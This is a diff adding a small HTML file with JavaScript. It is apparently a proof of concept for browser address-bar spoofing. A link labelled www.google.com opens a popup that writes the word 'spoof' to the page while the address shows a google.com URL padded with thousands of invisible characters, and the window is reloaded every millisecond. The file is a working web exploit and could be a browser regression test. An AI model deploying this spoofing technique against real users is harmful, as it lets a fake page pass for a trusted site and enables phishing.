@@ -1,0 +1,11 @@
+<script>
+    function go() {
+        url = 'https://www.google.com/' + Array(0xffff).join("%E2%A0%80");
+        url_1 = "javascript:document.write('<h1>spoof</h1>');location='" + url + "'";
+
+        w = window.open(url_1, "new", "width=600 height=600");
+        setInterval("try {w.location.reload()} catch(e) { w.location.replace('');}", 1);
+    }
+</script>
+
+<a href="#" onclick="go()">www.google.com</a>
